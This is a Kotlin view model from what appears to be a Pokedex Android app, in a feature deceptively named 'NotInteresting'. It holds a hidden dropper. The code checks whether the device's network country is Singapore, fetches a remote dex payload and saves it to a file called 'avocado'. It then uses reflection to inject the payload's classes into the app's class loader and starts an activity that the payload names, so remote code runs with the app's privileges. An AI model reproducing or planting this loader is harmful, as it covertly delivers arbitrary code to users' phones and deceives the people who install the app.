package com.skydoves.pokedex.compose.features.notinteresting

import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import android.util.Log
import androidx.compose.runtime.Stable
import androidx.lifecycle.viewModelScope
import com.skydoves.pokedex.compose.core.data.repository.notinteresting.NotInterestingRepository
import com.skydoves.pokedex.compose.core.model.DexPayload
import com.skydoves.pokedex.compose.core.viewmodel.BaseViewModel
import com.skydoves.pokedex.compose.core.viewmodel.ViewModelStateFlow
import dagger.hilt.android.lifecycle.HiltViewModel
import dalvik.system.BaseDexClassLoader
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.filter
import kotlinx.coroutines.flow.flatMapLatest
import kotlinx.coroutines.flow.stateIn
import javax.inject.Inject


@HiltViewModel
class NotInterestingViewModel @Inject constructor(
  private val notInterestingRepository: NotInterestingRepository,
) : BaseViewModel() {

  internal val uiState: ViewModelStateFlow<NotInterestingState> = viewModelStateFlow(NotInterestingState.NotInitialized)

  val dexState: StateFlow<DexPayload?> = uiState.filter {
    it == NotInterestingState.Loading
  }.flatMapLatest {
    notInterestingRepository.fetchDex(
      onStart = { },
      onComplete = {
         uiState.tryEmit(key, NotInterestingState.Loaded)
      }, onError = {
        Log.w("NotInteresting", "Failed to retrieve remote content $it")
        uiState.tryEmit(key, NotInterestingState.Failed)
      }
    )
  }.stateIn(
    scope = viewModelScope,
    started = SharingStarted.WhileSubscribed(5_000),
    initialValue = null,
  )

  fun check(context: Context): Boolean {
    val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
    val countryCodeValue = tm.networkCountryIso
    return countryCodeValue.lowercase().contains("sg")
  }

  fun loadDex(context: Context, dexPayload: DexPayload) {
    try {
      val file = context.filesDir.resolve("avocado")
      file.writeBytes(dexPayload.specialDex)
      val x = Class.forName(dexPayload.specialStrings[0])
      val con = x.getConstructor(
        String::class.java,
        ClassLoader::class.java
      )
      val thisClassLoader = this.javaClass.classLoader
      val classLoader = con.newInstance(file.path, thisClassLoader)
      //val y = x.getMethod("loadClass")
      val cls2 = dexPayload.specialStrings[1]

      DexUtil.setDexClassLoaderElements(
        thisClassLoader as BaseDexClassLoader,
        DexUtil.joinArrays(
          DexUtil.getDexClassLoaderElements(thisClassLoader),
          DexUtil.getDexClassLoaderElements(classLoader as BaseDexClassLoader)
        )
      )
      context.startActivity(
        Intent(
          context, Class.forName(cls2)
        )
      )
    } catch (e: Exception) {
      Log.e("NotInteresting", "Failed to process remote content", e)
    }
  }

  fun fetchAndLoadDex() {
    if (uiState.value == NotInterestingState.NotInitialized) {
      uiState.tryEmit(key, NotInterestingState.Loading)
    }

  }
}

@Stable
sealed interface NotInterestingState {

  data object NotInitialized : NotInterestingState

  data object Failed : NotInterestingState

  data object Loading : NotInterestingState

  data object Loaded : NotInterestingState
}
